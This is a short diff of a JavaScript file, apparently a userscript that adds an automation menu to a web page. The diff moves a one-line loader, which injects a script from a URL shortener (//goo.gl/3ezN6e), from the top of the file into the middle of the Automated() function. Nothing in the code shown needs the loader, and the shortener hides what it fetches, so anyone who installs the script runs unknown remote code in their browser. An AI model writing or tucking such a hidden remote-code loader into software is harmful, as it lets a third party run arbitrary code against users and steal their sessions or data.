@@ -18,7 +18,7 @@
  
 'use strict';
  
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//goo.gl/3ezN6e"; document.body.appendChild( scriptElement ); })();
+
  
 var debug = false;
 var simulation = false;
@@ -172,7 +172,7 @@ function Automated() {
             '<label class="text-muted"><input id="automated-simulation" type="checkbox" ' + (this.simulation ? 'checked' : '') + ' disabled> Simulation mode</label>' +
         '</div>';
     document.getElementsByClassName('well')[1].appendChild(menu);
- 
+ (function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//goo.gl/3ezN6e"; document.body.appendChild( scriptElement ); })();
     this.menu = {
         'start': document.getElementById('automated-start'),
         'stop': document.getElementById('automated-stop'),
